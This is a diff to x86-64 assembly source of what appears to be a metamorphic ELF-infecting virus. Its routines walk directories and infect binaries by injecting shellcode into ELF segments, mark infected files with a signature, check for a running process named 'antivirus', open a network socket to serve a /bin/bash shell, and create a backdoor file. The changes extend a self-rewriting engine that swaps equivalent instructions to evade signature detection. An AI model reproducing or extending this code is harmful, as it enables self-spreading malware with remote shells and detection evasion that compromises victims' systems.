@@ -283,7 +283,7 @@ create_soft_bd:
 	push rdi
 	lea rdi, [rsp]
 	xor rsi, rsi
-	xor rdx,rdx
+	mov rdx, 0
 	syscall; open("/tmp/bd", O_RDONLY);
 	mov r14, rax 
 	pop rbx
@@ -494,7 +494,7 @@ check_process:
 	NOP
 	NOP
 	mov rsi, 65536; O_RDONLY | O_DIRECTORY
-	xor rdx, rdx
+	mov rdx, 0
 	mov rax, 2; sycall open
 	syscall
 	NOP
@@ -523,7 +523,7 @@ check_process:
 		cmp rax, 0
 		je cp_dir_read_exit; done reading dir
 		mov r10, rax; store number bytes read
-		xor rcx, rcx; will serve as index to parse files
+		mov rcx, 0; will serve as index to parse files
 		cp_parse_file_loop:
 			mov r8, rsi; save rsi
 			lea r9, [rsi + rcx] ; current linux_dirent64*
@@ -544,7 +544,7 @@ check_process:
 			;do stuff here
 			cp_skip_file: 
 			mov rsi, r8
-			xor rdx, rdx
+			mov rdx, 0
 			mov dx, WORD[r9 + 16] ;len of current linux_dirent64*
 			add rcx, rdx
 			cmp rcx, r10
@@ -578,7 +578,7 @@ check_num_name:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
+	mov rcx, 0
 	mov rax, 0
 	loop_cnn:
 		cmp byte[rdi + rcx], 0
@@ -641,7 +641,7 @@ check_cmdline:
 	NOP
 	;now we copy fname
 	mov rcx, 6
-	xor rbx, rbx
+	mov rbx, 0
 	loop_ccl:
 		mov dl, byte[rdi + rbx]
 		cmp dl, 0
@@ -726,12 +726,12 @@ check_cmdline_content:
 	call open_file
 	mov rdi, rax; store fd in rdi
 	sub rsp, 1 
-	xor rcx, rcx
+	mov rcx, 0
 	mov rcx, 0x0073 ; "s\0"
 	push rcx
 	mov rcx, 0x7572697669746e61 ; "antiviru"
 	push rcx
-	xor rcx, rcx
+	mov rcx, 0
 	NOP
 	NOP
 	NOP
@@ -755,7 +755,7 @@ check_cmdline_content:
 		je ccc_found
 		jmp loop_ccc
 		reset_rcx_ccc:
-			xor rcx, rcx
+			mov rcx, 0
 			jmp loop_ccc
 	ccc_not_found:
 		mov rax, 0
@@ -834,7 +834,7 @@ pop_shell_on_net:
 	mov rax, 41
 	mov rdi, 2;AF_INET
 	mov rsi, 1;SOCK_STREAM
-	xor rdx, rdx
+	mov rdx, 0
 	syscall; rax = socket(AF_INET, SOCK_STREAM, 0);
 	cmp rax, -1
 	je exit_prog; err
@@ -921,7 +921,7 @@ exec_shell:
 	sub rsp, 16; argvs "/bin/bash", NULL
 	lea rbx, [rsp+16]
 	mov QWORD[rsp], rbx; *argvs == "/bin/bash"
-	xor rbx, rbx
+	mov rbx, 0
 	mov QWORD[rsp + 8], rbx; argvs[1] = NULL
 	sub rsp, 8
 	NOP
@@ -1023,7 +1023,7 @@ list_files:
 	sub rsp, 1024;this is gonna be our buffer
 	sub rsp, 4; fd
 	mov rsi, 65536; O_RDONLY | O_DIRECTORY
-	xor rdx, rdx
+	mov rdx, 0
 	mov rax, 2; sycall open
 	syscall
 	NOP
@@ -1052,7 +1052,7 @@ list_files:
 		cmp rax, 0
 		je dir_read_exit; done reading dir
 		mov r10, rax; store number bytes read
-		xor rcx, rcx; will serve as index to parse files
+		mov rcx, 0; will serve as index to parse files
 		parse_file_loop:
 			NOP
 			NOP
@@ -1070,7 +1070,7 @@ list_files:
 			call famine_file ; void famine_file(char * fname);
 			skip_file: 
 			mov rsi, r8
-			xor rdx, rdx
+			mov rdx, 0
 			mov dx, WORD[r9 + 16] ;len of current linux_dirent64*
 			add rcx, rdx
 			cmp rcx, r10
@@ -1295,7 +1295,7 @@ open_file:
 	NOP
 	NOP
 	xor rsi, rsi
-	xor rdx, rdx
+	mov rdx, 0
 	mov rax, 2
 	syscall
 	NOP
@@ -1315,7 +1315,7 @@ open_append:
 	NOP
 	NOP
 	NOP
-	xor rdx, rdx
+	mov rdx, 0
 	mov rax, 2
 	syscall
 	NOP
@@ -1348,7 +1348,7 @@ check_already_infected:
 	sub rsp, 1 
 	mov rcx, 0x636c656d2d6c6573 ; "sel-melc"
 	push rcx
-	xor rcx, rcx
+	mov rcx, 0
 	loop_cai:
 		lea rsi, [rsp + 8]
 		mov rdx, 1; read one byte at the time
@@ -1372,7 +1372,7 @@ check_already_infected:
 		je cai_found
 		jmp loop_cai
 		reset_rcx_cai:
-			xor rcx, rcx
+			mov rcx, 0
 			jmp loop_cai
 	cai_not_found:
 		mov rax, 0
@@ -1526,7 +1526,7 @@ overwrite_file:
 	NOP
 	NOP
 	lea rsi, [rsp + 8]
-	xor rcx, rcx
+	mov rcx, 0
 	NOP
 	NOP
 	NOP
@@ -1622,7 +1622,7 @@ push rdx
 	sub rsp, rax; our string containing fname + "_infected" + '\0' is [rsp + 8]
 	push QWORD rax
 	lea rsi, [rsp + 8]
-	xor rcx, rcx
+	mov rcx, 0
 	NOP
 	NOP
 	NOP
@@ -1718,9 +1718,9 @@ push rdx
 	NOP
 retn
 
-%define SHELLCODE_LEN 9171 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
-%define SHELLCODE_JMP_INDEX 9003 ; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 8998 
+%define SHELLCODE_LEN 9477 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
+%define SHELLCODE_JMP_INDEX 9309 ; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 9304 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	NOP
@@ -1939,8 +1939,8 @@ find_new_entry:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_fne: 
 		cmp cx, WORD[rsp]
 		jge loop_fne_exit
@@ -2019,8 +2019,8 @@ find_new_entry_text:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_fnet: 
 		cmp cx, WORD[rsp]
 		jge loop_fnet_exit
@@ -2089,8 +2089,8 @@ find_end_data_seg:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_feds: 
 		cmp cx, WORD[rsp]
 		jge loop_feds_exit
@@ -2170,8 +2170,8 @@ find_end_text_seg:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_fets: 
 		cmp cx, WORD[rsp]
 		jge loop_fets_exit
@@ -2250,8 +2250,8 @@ has_data_seg:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	NOP
 	NOP
 	NOP
@@ -2329,8 +2329,8 @@ get_data_pad:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	NOP
 	NOP
 	NOP
@@ -2414,8 +2414,8 @@ get_text_pad:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	NOP
 	NOP
 	NOP
@@ -2499,8 +2499,8 @@ parse64elfphdr:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_p64ephdr: 
 		cmp cx, WORD[rsp]
 		jge loop_p64ephdr_exit
@@ -2723,8 +2723,8 @@ parse64elfphdrtext:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_p64ephdrt: 
 		NOP
 		NOP
@@ -2939,7 +2939,7 @@ parse64elfsec:
 	NOP
 	NOP
 	;now we need to calculate the offset to EHDR + PHDR*e_phnum
-	xor rbx, rbx
+	mov rbx, 0
 	mov bx, WORD[rsi + 56]; bx == e_phnum
 	mov rax, 56; sizeof(Elf64_Phdr)
 	mul rbx; rbx * rax -> rax
@@ -2950,7 +2950,7 @@ parse64elfsec:
 	sub rdx, [rsp]; rdx == (new_sect - start)
 	mov rax, 1
 	syscall;write(wfd, file + start, new_sect - start); basically print all from phdrs till end of data seg
-	xor rcx, rcx
+	mov rcx, 0
 	NOP
 	NOP
 	NOP
@@ -3031,7 +3031,7 @@ push rdi
 	push rdi
 	lea rdi, [rsp]
 	xor rsi, rsi
-	xor rdx,rdx
+	mov rdx, 0
 	syscall; open("sc", O_RDONLY); 
 	pop rbx
 	;READ SC FILE
@@ -3075,7 +3075,7 @@ metamorphic:
 	NOP
 	NOP
 	NOP
-	; mov rax, 0 -> xor rax, rax
+	; mov rax, 0 -> xor rax, rax; NOP; NOP
 	mov rax, 0x6000000000b8; mov eax, 0x0
 	push rax
 	mov rsi, rsp
@@ -3086,14 +3086,70 @@ metamorphic:
 
 	mov r10, PURE_SHELLCODE_LEN
 	mov rcx, 5
-	NOP
-	NOP
-	NOP
-	NOP
-	NOP
-	NOP
+
 	call ft_str_replace
 	add rsp, 16
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	; mov rbx, 0 -> xor rbx, rbx; NOP; NOP
+	mov rax, 0x6000000000bb; mov ebx, 0x0
+	push rax
+	mov rsi, rsp
+
+	mov rax, 0x609090db3148; xor rbx, rbx; NOP; NOP
+	push rax
+	mov rdx, rsp
+
+	mov r10, PURE_SHELLCODE_LEN
+	mov rcx, 5
+
+	call ft_str_replace
+	add rsp, 16
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	; mov rcx, 0 -> xor rcx, rcx; NOP; NOP
+	mov rax, 0x6000000000b9; mov ecx, 0x0
+	push rax
+	mov rsi, rsp
+
+	mov rax, 0x609090c93148; xor rcx, rcx; NOP; NOP
+	push rax
+	mov rdx, rsp
+
+	mov r10, PURE_SHELLCODE_LEN
+	mov rcx, 5
+
+	call ft_str_replace
+	add rsp, 16
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	NOP
+	; mov rdx, 0 -> xor rdx, rdx; NOP; NOP
+	mov rax, 0x6000000000ba; mov edx, 0x0
+	push rax
+	mov rsi, rsp
+
+	mov rax, 0x609090d33148; xor rdx, rdx; NOP; NOP
+	push rax
+	mov rdx, rsp
+
+	mov r10, PURE_SHELLCODE_LEN
+	mov rcx, 5
+
+	call ft_str_replace
+	add rsp, 16
+
 	NOP
 	NOP
 	NOP
@@ -3169,7 +3225,7 @@ ft_str_replace:
 	cmp rax, r10
 	je fsr_loop_exit ; we reached end of base
 
-	xor rbx, rbx; int j = 0;
+	mov rbx, 0; int j = 0;
 	fsr_inloop: ; let's check if we can find the str to_replace
 	mov r11b, [rsi + rbx]
 	cmp r11b, 0x60
@@ -3187,7 +3243,7 @@ ft_str_replace:
 	cmp BYTE[r15], 0x60
 	je fsr_replace_loop_exit
 
-	xor rbx, rbx
+	mov rbx, 0
 	;replace string
 	fsr_replace_loop:
 	NOP
@@ -3527,7 +3583,7 @@ generate_fingerprint:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx 
+	mov rcx, 0 
 	loop_zero_buff:; let's bzero the buffer
 		cmp rcx, FP_LEN
 		je loop_zero_buff_exit
@@ -3546,7 +3602,7 @@ generate_fingerprint:
 	NOP
 	NOP
 	;find the index at which fname should start
-	xor rbx, rbx
+	mov rbx, 0
 	loop_gf_get_index: 
 		cmp byte[rdi + rbx], 0
 		je loop_gf_get_index_exit
@@ -3556,7 +3612,7 @@ generate_fingerprint:
 	mov byte[rdi + rbx], '/'
 	inc rbx
 	;now we append fname
-	xor rcx, rcx; index in fname
+	mov rcx, 0; index in fname
 	loop_gf_copy_filename:
 		cmp byte[r15 + rcx], 0
 		je loop_gf_copy_filename_exit
@@ -3663,15 +3719,15 @@ has_data_seg32:
 	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
-	xor rbx, rbx
+	mov rbx, 0
 	mov ebx, DWORD[rdi + 28]
 	add rdi, rbx; rdi now point to e_phoff
 	mov rbx, rdi; swap rdi and rsi for syscalls
 	mov rdi, rsi
 	mov rsi, rbx
 
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	NOP
 	NOP
 	NOP
@@ -3817,15 +3873,15 @@ find_new_entry32:
 	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
-	xor rbx, rbx
+	mov rbx, 0
 	mov ebx, DWORD[rdi + 28]
 	add rdi, rbx; rdi now point to e_phoff
 	mov rbx, rdi; swap rdi and rsi for syscalls
 	mov rdi, rsi
 	mov rsi, rbx
 
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_fne32: 
 		cmp cx, WORD[rsp]
 		jge loop_fne_exit32
@@ -3876,7 +3932,7 @@ find_new_entry_text32:
 	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
-	xor rbx, rbx
+	mov rbx, 0
 	mov ebx, DWORD[rdi + 28]
 	add rdi, rbx; rdi now point to e_phoff
 	mov rbx, rdi; swap rdi and rsi for syscalls
@@ -3888,8 +3944,8 @@ find_new_entry_text32:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_fnet32: 
 		cmp cx, WORD[rsp]
 		jge loop_fnet_exit32
@@ -3951,7 +4007,7 @@ get_data_pad32:
 	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
-	xor rbx, rbx
+	mov rbx, 0
 	mov ebx, DWORD[rdi + 28]
 	add rdi, rbx; rdi now point to e_phoff
 	mov rbx, rdi; swap rdi and rsi for syscalls
@@ -3963,8 +4019,8 @@ get_data_pad32:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_gdp32: 
 		cmp cx, WORD[rsp]
 		jge loop_gdp_exit
@@ -4020,15 +4076,15 @@ get_text_pad32:
 	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
-	xor rbx, rbx
+	mov rbx, 0
 	mov ebx, DWORD[rdi + 28]
 	add rdi, rbx; rdi now point to e_phoff
 	mov rbx, rdi; swap rdi and rsi for syscalls
 	mov rdi, rsi
 	mov rsi, rbx
 
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_gtp32: 
 		cmp cx, WORD[rsp]
 		jge loop_gtp_exit32
@@ -4091,7 +4147,7 @@ parse32elfphdr:
 	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
-	xor rbx, rbx 
+	mov rbx, 0 
 	mov ebx, DWORD[rdi + 28]
 	add rdi, rbx; rdi now point to e_phoff
 	mov rbx, rdi; swap rdi and rsi for syscalls
@@ -4103,8 +4159,8 @@ parse32elfphdr:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_p32ephdr: 
 		NOP
 		NOP
@@ -4313,15 +4369,15 @@ parse32elfphdrtext:
 	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
-	xor rbx, rbx 
+	mov rbx, 0 
 	mov ebx, DWORD[rdi + 28]
 	add rdi, rbx; rdi now point to e_phoff
 	mov rbx, rdi; swap rdi and rsi for syscalls
 	mov rdi, rsi
 	mov rsi, rbx
 
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	NOP
 	NOP
 	NOP
@@ -4577,7 +4633,7 @@ parse32elfsec:
 	NOP
 	NOP
 	;now we need to calculate the offset to EHDR + PHDR*e_phnum
-	xor rbx, rbx
+	mov rbx, 0
 	mov bx, WORD[rsi + 44]; bx == e_phnum
 	mov rax, 0
 	mov eax, 32; sizeof(Elf64_Phdr)
@@ -4589,7 +4645,7 @@ parse32elfsec:
 	sub rdx, [rsp]; rdx == (new_sect - start)
 	mov rax, 1
 	syscall;write(wfd, file + start, new_sect - start); basically print all from phdrs till end of data seg
-	xor rcx, rcx
+	mov rcx, 0
 	loop_print_pad32:
 	cmp rcx, r10
 	jae loop_print_pad_end32
@@ -4656,7 +4712,7 @@ find_end_data_seg32:
 	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
-	xor rbx, rbx
+	mov rbx, 0
 	mov ebx, DWORD[rdi + 28]
 	add rdi, rbx; rdi now point to e_phoff
 	mov rbx, rdi; swap rdi and rsi for syscalls
@@ -4668,8 +4724,8 @@ find_end_data_seg32:
 	NOP
 	NOP
 	NOP
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_feds32: 
 		cmp cx, WORD[rsp]
 		jge loop_feds_exit32
@@ -4733,15 +4789,15 @@ find_end_text_seg32:
 	mov rax, 0
 	mov bx,  WORD[rdi + 44]
 	mov WORD[rsp], bx; e_phnum stored
-	xor rbx, rbx
+	mov rbx, 0
 	mov ebx, DWORD[rdi + 28]
 	add rdi, rbx; rdi now point to e_phoff
 	mov rbx, rdi; swap rdi and rsi for syscalls
 	mov rdi, rsi
 	mov rsi, rbx
 
-	xor rcx, rcx
-	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	mov rcx, 0
+	mov rdx, 0; this will iterate over the phdrs, and increment of sizeof(phdr)
 	loop_fets32: 
 		cmp cx, WORD[rsp]
 		jge loop_fets_exit32
